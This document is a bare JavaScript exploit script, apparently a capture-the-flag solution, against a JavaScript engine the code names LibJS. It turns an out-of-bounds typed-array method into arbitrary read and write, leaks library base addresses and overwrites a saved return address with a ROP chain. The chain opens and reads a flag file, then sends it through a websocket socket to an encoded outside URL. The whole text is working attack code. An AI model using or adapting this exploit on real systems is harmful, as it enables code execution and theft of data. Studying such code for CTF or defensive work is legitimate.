var ab = new ArrayBuffer(8);
var ab2 = new ArrayBuffer(0x1234);
var arr1 = new Uint32Array(ab);
var arr2 = new Uint32Array(ab2);

arr2[1] = 0x12345678;

var ab_index = -1;
for (var i = 0; i < 0x100; i++) {
    if(arr1.oob(i) === 0x1234) {
        ab_index = i;
        break;
    }
}

if (ab_index === -1) {
    console.log("ab_index not found")
    throw Error("err");
}

console.log("ab_index: " + ab_index);

var malloc_leak = arr1.oob(ab_index - 9);
var ab_buf_addr = arr1.oob(ab_index - 8);
console.log("malloc_leak: 0x" + malloc_leak.toString(16));
console.log("ab_buf_addr: 0x" + ab_buf_addr.toString(16));

function read32(addr) {
    var current = arr1.oob(ab_index - 8);
    arr1.oob(ab_index - 8, addr);
    var value = arr2[0];
    arr1.oob(ab_index - 8, current);
    return value;
}

function write32(addr, value) {
    var current = arr1.oob(ab_index - 8);
    arr1.oob(ab_index - 8, addr);
    arr2[0] = value;
    arr1.oob(ab_index - 8, current);
    return value;
}

arr2[0] = 0x11111111;

var libjs_leak = read32(malloc_leak)
console.log("libjs_leak: 0x" + libjs_leak.toString(16));

var libjs_base = libjs_leak - 0x31cee0;
console.log("libjs_base: 0x" + libjs_base.toString(16));

var libc_leak = read32(libjs_base + 0x3192d8)
console.log("libc_leak: 0x" + libc_leak.toString(16));

var libc_base = libc_leak - 0xa5798
console.log("libc_base: 0x" + libc_base.toString(16));


var libsystem_base = read32(libc_base + 0xa595c) - 0x1000
console.log("libsystem_base: 0x" + libsystem_base.toString(16));

var environ = read32(libc_base + 0xa6394)
console.log("environ: 0x" + environ.toString(16));

var js_run = libjs_base + 0xd42bf // JS::Interpreter::run
console.log("js_run: 0x" + js_run.toString(16));

var saved_ret = -1;
for (var i = 0; i < 0x10000; i++) {
    if (read32(environ - i*4) === js_run + 1) {
        saved_ret = environ - i*4;
        break;
    }
}

if (saved_ret === -1) {
    console.log("saved_ret not found")
    throw Error("err");
}

console.log("saved_ret: 0x" + saved_ret.toString(16));

var syscall1 = libsystem_base + 0x1010;
console.log("syscall1: 0x" + syscall1.toString(16));

var syscall2 = libsystem_base + 0x1020;
console.log("syscall2: 0x" + syscall2.toString(16));

var syscall3 = libsystem_base + 0x1030;
console.log("syscall3: 0x" + syscall1.toString(16));

var unveil_syscall = 146;
var dbgputstr_syscall = 19;
var open_syscall = 84;
var read_syscall = 97;
var write_syscall = 149;
var socket_syscall = 133;
var connect_syscall = 15;

var pop3 = libjs_base + 0x0008c690; // : pop ebx; pop esi; pop ebp; ret; 
console.log("pop3: 0x" + pop3.toString(16));

var pop2 = libjs_base + 0x0008c691; // pop esi; pop ebp; ret; 
console.log("pop2: 0x" + pop2.toString(16));

var pop4 = libjs_base + 0x0008a581 // : pop ebx; pop esi; pop edi; pop ebp; ret;
console.log("pop4: 0x" + pop4.toString(16));


var unveil_params_addr = ab_buf_addr + 0x100;
var unveil_perm_addr = ab_buf_addr + 0x200;
var flag_path_addr = ab_buf_addr + 0x300;
var open_params_addr = ab_buf_addr + 0x400;
var flag_addr = ab_buf_addr + 0x500;
var websocket_path_addr = ab_buf_addr + 0x550;
var open2_params_addr = ab_buf_addr + 0x600;
var payload_addr = ab_buf_addr - 0x800;


write32(unveil_perm_addr, 0x72)
write32(flag_path_addr, 0x616c662f)
write32(flag_path_addr+4, 0x78742e67)
write32(flag_path_addr+8, 0x74)

write32(unveil_params_addr, flag_path_addr)
write32(unveil_params_addr+4, 10)
write32(unveil_params_addr+8, unveil_perm_addr)
write32(unveil_params_addr+12, 2)

write32(open_params_addr, 0xffffff9c)
write32(open_params_addr+4, flag_path_addr)
write32(open_params_addr+8, 10)
write32(open_params_addr+12, 1)
write32(open_params_addr+16, 0)

// write32(flag_addr, 0x41414141)

// // /tmp/portal/websocket
var socket_addr = websocket_path_addr - 2;
write32(socket_addr, 1)
write32(websocket_path_addr, 0x706d742f)
write32(websocket_path_addr + 4, 0x726f702f)
write32(websocket_path_addr + 8, 0x2f6c6174)
write32(websocket_path_addr + 12, 0x73626577)
write32(websocket_path_addr + 16, 0x656b636f)
write32(websocket_path_addr + 20, 0x74)

var payload = [
    0,
    1144104864,
    1,
    0x40,
    0x2F3A7377,
    0x2E77612F,
    0x313A7372,
    0x35343332,
    0x6767672F,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0x67676767,
    0xFFFFFFFF,
    0,0,0,0,0,0
]

payload[0] = payload.length * 4 - 4;

for (var i = 0; i<payload.length; i++) {
    write32(payload_addr + i*4, payload[i])
}

flag_addr = payload_addr + 4 * 9 - 1;

var jmp_eax = libjs_base +  0x000940b1 //: jmp eax;
var rop = [

    syscall1,
    0x11111111,
    pop2,       // next eip
    unveil_syscall,
    unveil_params_addr,

    syscall1,
    pop2,       // next eip
    open_syscall,
    open_params_addr,

    syscall3,
    pop4,
    read_syscall,
    0x8,
    flag_addr,
    46,

    pop4,0,0,0,0,

    syscall2,
    pop3,
    dbgputstr_syscall,
    flag_addr,
    46,

    syscall3,
    pop4,
    socket_syscall,
    1,
    1,
    0,

    syscall3,
    pop4,
    connect_syscall,
    0xd,
    socket_addr,
    110,

    syscall3,
    pop4,
    write_syscall,
    0xd,
    payload_addr,
    payload.length * 4,

    syscall3,
    0x22222222,
    read_syscall,
    3,
    flag_addr,
    0x100,

    0x33333333,
    0x44444444,
    0x55555555,
    0x66666666,
    0x77777777,
];

for (var i = 0; i < rop.length; i++) {
    write32(saved_ret + 4*i, rop[i])
}